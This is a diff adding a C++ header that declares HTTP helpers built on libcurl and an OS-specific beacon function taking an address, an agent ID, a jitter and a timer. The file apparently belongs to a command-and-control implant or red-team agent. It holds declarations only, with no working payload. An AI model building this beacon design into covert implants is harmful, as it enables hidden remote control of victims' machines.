@@ -1,0 +1,32 @@
+#ifndef HTTPREQUESTS_H
+#define HTTPREQUESTS_H
+
+#include <iostream>
+#include <string>
+#include <vector>
+#include <tuple>
+#include <stdexcept>
+#include <curl/curl.h>
+#include <json/json.h>
+#include <thread>
+#include <chrono>
+#include <cstdlib> 
+
+
+#ifdef __unix__
+#define OS "Linux"
+#include "../Linux/generic.h"
+#endif
+
+#ifdef WIN32
+#define OS "Windows"
+#include "../Windows/generic.h"
+#endif
+
+
+size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s);
+std::tuple<int, std::string, std::string> getRequest(const std::string& url);
+std::tuple<int, std::string, int> httpConnection(const std::string& address);
+void beacon(const std::string& address, const std::string& ID, int jitter, int timer);
+
+#endif
